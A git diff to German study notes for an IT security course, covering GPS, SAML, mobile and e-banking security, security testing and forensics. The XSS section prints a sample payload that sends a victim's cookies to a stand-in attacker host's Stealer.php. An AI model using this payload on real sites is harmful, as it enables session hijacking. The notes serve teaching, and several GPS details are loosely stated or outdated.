@@ -318,6 +318,29 @@ Google hat ziemliche Umfangreiche Informationen über Benutzer, da sie auf sehr 
 
 Die Kombination dieser Merkmale ist einmahlig und damit der Benutzer eindeutig zuortbar/idenitifizierbar.
 
+**2.1.17. AGPS**
+
+In AGPS, the Network Operator deploys an AGPS server. These AGPS servers download the orbital information from the satellite and store it in the database. Download speed for client is much faster of cellular network that from Satellite at 50 Bit/s it is also possible that Satellite goes out of sight and download needs to be started again.
+
+
+**2.1.18. GPS Alternativen**
+
+* Glonass: russisch, 24 Satelliten
+* Galileo: Europäisch, bestehend aus 30 Satelliten 
+* Beidou Navigation Satellite System: Chinesisch, begrenzt auf chinesisches Gebiet
+
+
+**2.1.19. GPS Daten Korrektur**
+
+Durch Basisstation (Standort ist berrechnet als const und auf Laufbahn). Liegt Satellite direkt über Basis Station kann eine Kalibration des Softwares stattfinden.
+
+	
+**2.1.20. Minimale Anzahl Satteliten für Triangulation**
+
+* Mind. 3 (trigo..) je mehr desto präziser wird die Messung 
+* Bei GPS sind immer vier sichtbar.
+
+
 
 3 Software Security
 ===================
@@ -997,24 +1020,24 @@ IdP-Initiated
 SP-Initiated
 	In SP-Init, the SP generates an AuthnRequest that is sent to the IDP as the first step in the Federation process and the IDP then responds with a SAML Response.
 
-.. figure:: img/rq-6.2.9.1.jpg
+.. figure:: img/rq-6.2.9.1.gif
 
    IdP-Initiated
 
 
-.. figure:: img/rq-6.2.9.2.jpg
+.. figure:: img/rq-6.2.9.2.gif
 
    SP-Initiated
 
 
 **6.2.10. SAML based SSO**
 
-.. figure:: img/rq-6.2.10.1.jpg
+.. figure:: img/rq-6.2.10.1.png
 
    Post Bindings
 
 
-.. figure:: img/rq-6.2.10.2.jpg
+.. figure:: img/rq-6.2.10.2.gif
 
    Artefakten
 
@@ -1079,7 +1102,7 @@ HTTP Only
 
 Protocoll+Host+Port stimmen überein
 
-.. image:: img/rq-6.3.1.1.jpg
+.. image:: img/rq-6.3.1.1.png
 
 
 **6.3.2. über eine XSS Lücke Sessions klauen**
@@ -1090,7 +1113,8 @@ Beispiel:
 
 ::
 
-	hxxp://www.example.com/index.php?search=<script>location.href = 'http://www.Yoursite.com/Stealer.php?cookie='+document.cookie;</script>
+	hxxp://www.example.com/index.php?search=<script>location.href = 
+	'http://www.Yoursite.com/Stealer.php?cookie='+document.cookie;</script>
 
 
 * Stealer.php macht dann selber ein redirect zum refer. Benutzer merkt fast nichts.
@@ -1133,7 +1157,7 @@ DOM injections
 
 **7.0.1. "Mobile Applications Plattform"**
 
-.. image:: img/rq-7.0.1.1.jpg
+.. image:: img/rq-7.0.1.1.png
 
 
 **7.0.2.  OWASP im Threat Modelling Process**
@@ -1180,7 +1204,7 @@ Controls 
 
 Human Interaction vs Automated Programs
 
-.. image:: img/rq-7.0.6.1.jpg
+.. image:: img/rq-7.0.6.1.png
 
 
 **7.0.7. Angriffsszenarien bei einem Mobile Device**
@@ -1204,7 +1228,7 @@ Human Interaction vs Automated Programs
 * iOS: Auch gescannt, manuell überprüft. (schwieriger)
 * Angriff auf AppStore selbst
 
-.. figure:: img/rq-7.0.9.1.jpg
+.. figure:: img/rq-7.0.9.1.png
 
    Lines of Defense
 
@@ -1226,7 +1250,7 @@ Problem
 
 **7.0.12. Sicherheitsprobleme im Smartphone Umfeld**
 
-.. figure:: img/rq-7.0.12.1.jpg
+.. figure:: img/rq-7.0.12.1.png
 
    PC-Welt
 
@@ -1357,12 +1381,12 @@ Data Partition
 	
 **8.0.8. Filesystem- und Fileverschlüsselung**
 
-.. figure:: img/rq-8.0.8.1.jpg
+.. figure:: img/rq-8.0.8.1.png
 
    Filesystem
 
 
-.. figure:: img/rq-8.0.8.2.jpg
+.. figure:: img/rq-8.0.8.2.png
 
    File
 
@@ -1391,3 +1415,400 @@ Wiederherstellung
 
 8.1 EJPD Architektur
 --------------------
+
+**8.1.0. Warum ist mTan unsicher?**
+
+The security of this scheme depends on the security of the mobile phone system.
+
+In South Africa, where SMS-delivered TAN codes are common, a new attack has appeared: SIM Swap Fraud. A common attack vector is for the attacker to impersonate the victim, and obtain a replacement SIM card for the victim's phone from the mobile network operator. The victim's user name and password are obtained by other means (such as keylogging or phishing). In-between obtaining the cloned/replacement SIM and the victim noticing their phone no longer works, the attacker can transfer/extract the victim's funds from their accounts.
+
+It is possible to access a online bank on the same devices as the mTan which then reduces the security drastically! (no second device)
+
+
+**8.1.1. MobileID**
+
+* Eine neue Authentisierungsmittel für Single-Sign-On.
+
+Wie kam es dazu?
+	Kantonale Polizeikorps möchten mit iOS Geräten auf das SSO-Portal zugreifen.  Login via SSO erfolgt normal über Client-Zertifikaten via Smart-Card. SmartCard-Anbindung an mobile Geräte ist nur schwer und umständlich
+
+Idee
+	* SIM-Karte wird als Träger eines privaten und eines öffentlichen Schlüssels (analog Smartcard)
+	* Einsatz von Mobile Device Management
+	* Zertifikate der Swisscom und AdminPKI werden akzeptiert.
+
+.. image:: img/rq-8.1.1.1.png
+
+
+* Über Mobile ID lassen sich die jeweiligen digitalen Identitäten eindeutig feststellen; Zugänge und Interaktionen werden effektiv geschützt. https://www.youtube.com/watch?v=WfKMWcDTG80
+* Vertraut muss Swisscom für die Authentifizierung.
+
+
+
+9 Sicherheitsüberprüfung
+========================
+
+**9.0.1. Treiber zur Durchführung von Sicherheitsprüfungen**
+
+Grundsätzlich: Risiken
+
+.. image:: img/rq-9.0.1.1.png
+
+
+3 Motivationsgründe:
+
+Firmen interne Anforderung
+	* Unternehmen fordern im Rahmen von Projekt-Abnahmen eine Sicherheitsprüfung durch eine externe Firma.
+	* Sicherheitssensitive Unternehmen verlangen für Anwendungen, welche über Internet erreichbar sind eine Sicherheitsprüfung.
+	* Nachweis von sicherheitsrelevanten Bedenken («Facts»-Beschaffung)
+	* Nachweis für Handlungsbedarf (Budgetbeschaffung)
+	
+Regulatorische Anforderungen
+	* Regulatorische Bestimmungen erfordern eine jährliche Sicherheitsprüfung von kritischen Anwendungen. Solche Anforderungen sind aktuell bei Finanzdienstleistern, Versicherungen und Kreditkarten-Unternehmen vorhanden.
+
+Qualitätsnachweis
+	* Zertifizierung («Güte Siegel»)
+
+
+**9.0.2. Bedeutung aller Ebenen**
+
+Auf alle Ebenen der IT Cremeschnitte befinden sich mögliche Bedrohungen
+
+
+**9.0.3. Testing Actions, Testing Types und Testing Teams**
+ 
+Testing Actions
+	* Security review
+	* Security assessment
+	* Security audit
+	* Penetration testing
+	* Vulnerability testing
+	* Security scan
+	
+Testing Types
+	* Black Box test
+	* Gray Box test
+	* White Box (Glassbox) test
+	
+Testing Teams
+	* Tiger Team, White Hat 
+	* Hacker, Ethical Hacking
+
+.. note:: Tiger Team: a team of specialists in a particular field brought together to work on specific tasks.
+
+
+**9.0.4. Black- und White Box testing**
+
+Blackbox-Testing
+	Black Box Testing, also known as Behavioral Testing, is a software testing method in which the internal structure/design/implementation of the item being tested is not known to the tester. These tests can be functional or non-functional, though usually functional.
+
+Whitebox-Testing
+	White Box Testing (also known as Clear Box Testing, Open Box Testing, Glass Box Testing, Transparent Box Testing, Code-Based Testing or Structural Testing) is a software testing method in which the internal structure/design/implementation of the item being tested is known to the tester.
+
+	
+**9.0.5. Begriffe**
+
+a. Security Audit
+	Untersuchungsverfahren die dazu dienen, Prozesse hinsichtlich der Erfüllung von Anforderungen  und Richtlinien (z.B. Standards) zu bewerten.
+
+b. Review
+	Beurteilung  von Software (Softwaretests) oder von Konzepten.
+
+c. Penetrationstests
+	Überprüfung  der Sicherheit von Systemen und Anwendungen (Netzwerkkomponenten, Server, Softwarekomponenten)  mit Mitteln und Methoden, die ein Angreifer (ugs. "Hacker") anwenden würde, um unautorisiert in das System einzudringen (Penetration). 
+
+
+**9.0.6. False Positives und False Negatives**
+
+False Positives
+	Fehlalarm
+False Negatives
+	Miss
+
+.. image:: img/rq-9.0.6.1.png
+
+
+**9.0.7. Vor- und Nachteile von Black- und White Box Tests**
+
+Blackbox
+
+Whitebox
+	* Wenig Aufwand seitens Kunde
+	* Awareness-Effekt
+	* Weniger unbekannte Risiken (weniger „Misses“)
+	* Weniger Nacharbeit
+	
+* White-Box ist effizienter in Bezug auf den Aufwand zur Verbesserung der Situation
+* White-Box führt seltener zu Falschaussagen (False-Positives)
+* Black-Box ist attraktiver/effizienter in Bezug auf Sensibilisierung
+
+
+**9.0.8. Begriffe im Zusammenhang mit Prüftiefe**
+
+a. Plausibilisierung
+	* Es kann nicht immer die Richtigkeit des Wertes oder Ergebnisses verifiziert werden, sondern es soll eine gegebenenfalls vorhandene offensichtliche Unrichtigkeit erkannt werden. 
+	* Ein Vorteil der Plausibilitätskontrolle ist, dass sie mit lediglich geringem Aufwand durchgeführt werden kann, ein Nachteil ist, dass weniger offensichtliche Unrichtigkeiten in ihrem Rahmen nicht erkannt werden.
+ 
+b. Inspektion
+	* Die Inspektion dient der Feststellung des ordnungsgemässen Zustandes eines Gegenstandes, eines Sachverhaltes oder einer Einrichtung. 
+	* Die korrekte Funktion wird dabei üblicherweise nicht verifiziert. z.B. FirewallKonfiguration, Standardkomponenten, etc
+
+c. Prüfung
+	* Beurteilung einer Leistung. Der zu prüfende Bereich oder Gegenstand wird gegen einen definierten und erwarteten Zustand, Funktion verifiziert. 
+	* Aufwändiges Verfahren, bietet jedoch höchstmögliche Zuverlässigkeit.
+
+
+**9.0.9. Ablauf SP**
+
+.. image:: img/rq-9.0.9.1.png
+
+
+**9.0.10. Vor- und Nachteile automatischer Tests/Scanners**
+
+Vorteile
+	* Sicherstellung der Vollständigkeit
+	* Schnelle und günstige Aussage zu Systemzustand (tendenz)
+	* Kann Anhaltspunkte für vertiefte Prüfungen geben
+
+Nachteile
+	* Grosse Anzahl von false positives
+	* Grosser Aufwand für die Bereinigung der Meldungen. Die Beurteilung von Schwachstellen der Scanner (CVE) kann nicht  immer eins zu eins übernommen werden. 
+	* Aufwändige  Arbeit, Risiko-Einschätzung kann nur Ansatzweise durch den Scanner übernommen werden.
+
+
+**9.0.11. SP Dokumentation**
+
+1) Reports erstellen
+	* Empfänger-  (Stufen) gerecht aufbereiten (Management, Projektleiter, Techniker)
+
+2) Resultate mit Kunde abgleichen
+	* Mängel diskutieren und verifizieren
+	* Evtl. Schwachstellen präsentieren (und demonstrieren)
+	* Risikobeurteilung mit Kunden besprechen. (Abweichende Beurteilung zwischen Kunde und Prüfer sind möglich)
+ 
+3) Ergebnisse präsentieren
+	* Ergebnisse wenn möglich mit betroffenen Personen diskutieren, Problem aufzeigen. Das garantiert eine «langfristige» Verbesserung. 
+
+
+**9.0.12. Aufwände**
+
+a. Application Security Review (White-Box)
+	5 bis 20 und mehr Personen-Tage
+
+b. Penetrationstest (Black-Box)
+	2 bis 5 und mehr Personen-Tage
+
+c. Network Security Review (Grosse Netzwerke)
+	5 bis 20 und mehr Personen-Tage
+
+**9.0.13. typische Fehler, die bei Sicherheitsprüfungen gemacht werden**
+
+* Konzentration auf Schwachstellen anstatt auf Risiken
+* Prüfbereich (Scope) nicht richtig definiert
+* Kompetenz (technisch, sozial und psychologisch) der Prüfer ungenügend
+* Haltung gegenüber den Gesprächspartnern (Manager, Entwickler, Betreiber) zu wenig kritisch
+
+
+**9.0.14. Unterschiede Blackbox / Whitebox in Bezug auf das Wissen des Angreifers und des Angegriffenen**
+
+.. image:: img/rq-9.0.14.1.png
+
+
+**9.0.15. Im Rahmen eines Prüfauftrages soll festgestellt werden, ob die eingesetzten Firewalls einen «angemessenen» Schutz bieten. Geben Sie Beispiele an, was auf den folgenden Ebenen geprüft werden sollte?**
+
+Prozessebene
+	* Ist der Betrieb angemessen organisiert? (Change Management, Incident Management, …), Einhaltung von Richtlinien, Standards?
+
+Applikationsebene
+	* Sind die Firewall-Regeln sinnvoll und richtig? Sind die Zonen sinnvoll festgelegt (Netzwerk-Architektur)?
+ 
+Infrastrukturebene
+	* Ist die Plattform richtig aufgesetzt (HW, OS, Patches, Updates, System Hardening)
+
+	
+**9.0.16. Tools für automatisierte Tests**
+
+* Port Scanner
+* Network Enumerators
+* CGI-Sanner
+* Web Application Security Scanner
+
+
+
+10 E-banking & Mobile Banking
+=============================
+
+10.1 E-banking
+--------------
+
+10.1.1. mögliche Angriffspunkte beim e-Banking**
+ 
+Ein seriöser Bank verwendet stehts ein zwei-Gerät-Lösung. Zum PC (1) kommt immer einen zusätzlichen Gerät (2) hinzu (Natel, Token Generator, Postcard-Calculator,…).
+
+.. image:: img/rq-10.1.1.1.png
+
+
+* Malware auf Client
+* Hardware Keyloggers
+* Clickjacking
+* Man-In-the-Middle
+
+
+**10.1.2. Angriffspunkte bei der Authentifizierung mit mTan**
+
+Das mTAN verfahren schützt gegen Phishing des Passworts, in dem eine mTAN ausgelöst wird. (2-Step Auth)
+
+Authentication
+	Schützt nicht gegen Man-In-the-Middle des Browsers
+
+Transaction Verification
+	Schützt gegen Man-In-the-Middle (Verifizierung des Transactions in mTAN)
+
+	
+**10.1.3. Vergleichen Sicherheit der Personlichen Daten (Kontoeinsicht) und die Sicherheit einer Transaktion (Integrität) bei mTan**
+
+Siehe 10.1.2
+
+
+**10.1.4. Challenge-Response Tokens**
+
+* Challenge-Reponse bietet grundsätzlich die gleiche Sicherheit wie beim mTAN, ausser bei der Transaction Verfication. (Könnte man wiederum umgehen mit Malware auf Mobile - ist aber sehr aufwendig)
+
+* Beim mTAN werden Infos zur Transaction per SMS verschickt (Visual verification). Beim Challenge-Response wird nur nach einem erneuten Challenge-Reponse-Token verlangt. (Ausser man müsste den Betrag und Kontos eingeben als Parameter für die Tokenberrechnung - was aber nicht geschieht)
+
+
+**10.1.5. Starke authentisierung**
+
+Siehe 6.2.3
+
+
+**10.1.6.  Malware auf dem Computer und Man-in-the Middle**
+
+.. image:: img/rq-10.1.6.1.png
+
+
+* Loging + Reading Access: Kritisch
+* Transaction: für div. Verifikationsmethoden nicht kritisch
+
+
+10.2 Mobile Banking
+-------------------
+
+**10.2.1. Malware-Problematik beim Mobile Banking**
+
+Die Risiken sind wesentlich höher als beim e-Banking, da man allenfalls nur mit einem Gerät arbeitet (mTAN, mobileID, PhotoTan..)
+
+.. image:: img/rq-10.2.1.1.png
+
+
+**10.2.2. technischen Möglichkeiten zur Verbesserung der Mobile Banking Sicherheit**
+
+* Check certificates against specific trust store
+* Protect data through keychain protection mechanisms
+* Prevent screenshots
+* Jailbreak / rooting detection
+* Version Control of App / OS
+
+
+**10.2.3.  PhotoTAN App von Raiffeisen**
+
+* Public-Private Key Encryption
+* Bei diesem Verfahren codiert Raiffeisen E-Banking die Login- und Auftragsdaten in einem farbigen Mosaik. Dieses farbige Mosaik wird mittels Ihrem persönlichen Smartphone entschlüsselt und der zugehörige Freigabe-Code auf dem Smartphone-Display angezeigt. Das angezeigte Mosaik kann nur durch Ihr Smartphone entschlüsselt werden, da Ihr Smartphone mit einem Ihnen persönlich zugewiesenen Schlüssel einmalig aktiviert wurde. Einem E-Banking-Vertrag können mehrere Smartphones bzw. einem Smartphone können mehrere E-Banking-Verträge zugewiesen werden. PhotoTAN funktioniert ohne Internet- bzw. Telefonverbindung.
+
+.. image:: img/rq-10.2.3.1.png
+
+
+**10.2.4. Konzepte aus der PhotoTAN App für die Mobile Banking App**
+
+Beim Login-Prozess müssen Sie nur noch Vertragsnummer und Passwort eingeben. Danach entschlüsselt die PhotoTAN App im Hintergrund den PhotoTAN-Code und gibt diesen automatisch über die Raiffeisen App an das Mobile Banking zurück. 
+
+
+**10.2.5. Sicherheitsmassnahmen für die Mobile Banking App**
+
+* OS des Betriebssystems
+* 2 Factor Auth
+* Non-reusable
+* Non-replicable
+
+
+**10.2.6 mehrfache authentisierungslevel**
+
+Add more Auth for each Level.
+
+.. image:: img/rq-10.2.6.1.png
+
+
+
+11 Forensik
+===========
+
+**11.0.1. digitale Forensik**
+
+Digitale Forensik != IT != CSI
+
+Im Wesentlichen geht es um die Beantwortung der 7 W‘s:
+
+Wer?
+	* Wer bewegte bzw. veränderte Daten? Wer war anwesend und beteiligt?
+Was?
+	* Was wurde genau getan?
+Wann? 
+	* Datum und Uhrzeit
+Wo? 
+	* Genaue Ortsangabe.
+Womit?
+	* Welche Tools und/oder welche physikalischen Mittel wurden eingesetzt?
+Wie?
+	* Wie wurde vorgegangen?
+Warum?
+	* Warum wurde eine Änderung, Bewegung und/oder Abweichung vorgenommen?
+
+
+**11.0.2. Bedrohungen / Tatwerkzeuge, die Cyberkriminelle nutzen**
+
+1. Mobile Endgeräte
+2. Soziale Netzwerke
+3. Kritische Infrastrukturen (z. B. Verkehrsleitsysteme)
+4. Vertrauenswürdige Infrastrukturen (z. B. Zugang geschützt)
+5. Cloud Computing
+6. Big Data (z. B. gesammelte Daten zu Telefonaten)
+
+
+**11.0.3.  Warum werden sichergestellte Datenträger kopiert, bzw. über ein Gerät angeschlossen, das Schreibschutz gewährleistet**
+
+Sodass Daten nicht auf dem Datenträger geändert werden. Wäre es möglich eine Datei zu ändern, könnte man falsche Daten einspeisen oder Daten manipulieren. Man braucht auch immer einen Vergleichsmöglichkeit (Original)
+
+
+**11.0.4. Aufbereitung von Sichergestelltem Material**
+
+* Sobald Filesystem erkannt wird, werden alle Dateien aufgelistet (Bilder, Dokumente, etc)*, eine HASH davon gemacht und mit diversen Datenbanken verglichen.
+* Whitelist-DB => manuell schnell überflogen (zwingend Bestätigung vom Auswerter benötigt)
+* Known-Hashes => Vergleich der Bilder
+* Unknown-Hashes => Kiddy Porn / Not Kiddy Porn (bei Unklarheiten, drei unabhängige Personen Fragen)
+* Es wird nicht nur auf Dateiendungen geachtet sondern auch auf Dateiinhaltet (ist exe wirklich exe oder ein JPG?)
+* Die Auswertung von Hooligan-Laptops erfolgt nach dem gleichen Prinzip, wird aber mit einer anderen Hash-DB verglichen.
+
+
+**11.0.5. Wie weit wird die Auswertung manuell und durch Software durchgeführt?**
+
+* Aufbereitung => Software
+* Auswertung => manuell
+
+.. image:: img/rq-11.0.5.1.png
+
+
+**11.0.6. Wie werden Smartphones ausgewertet, wenn kein direkter Zugriff auf die Daten über einen Rechner besteht? Wie wird dabei sichergestellt, das trotz der Veränderungen auf dem Gerät die Gerichtsverwertbarkeit nicht beeinträchtigt wird?**
+
+* Screenshots + Verschickt.
+* Foto von Screen + Auf PC abgeschrieben.
+* Bei jedem Eingriff auf das Gerät werden alle Schritte zwingend Dokumentiert, um die Gerichtsverwertbarkeit sicherzustellen.
+
+
+**11.0.7. Aus welchem Grund ist die Datenmenge, die das Labor auszuwerten hat seit 2007 stark angestiegen?**
+
+* Die Geräte haben immer mehr Platz und es muss die ganze Festplatte/SD Card kopiert werden.
+
+
+**11.0.8. Welchen Herausforderungen muss sich die digitale Forensik immer wieder stellen?**
+
+* Neue Software / Apps / OS. 
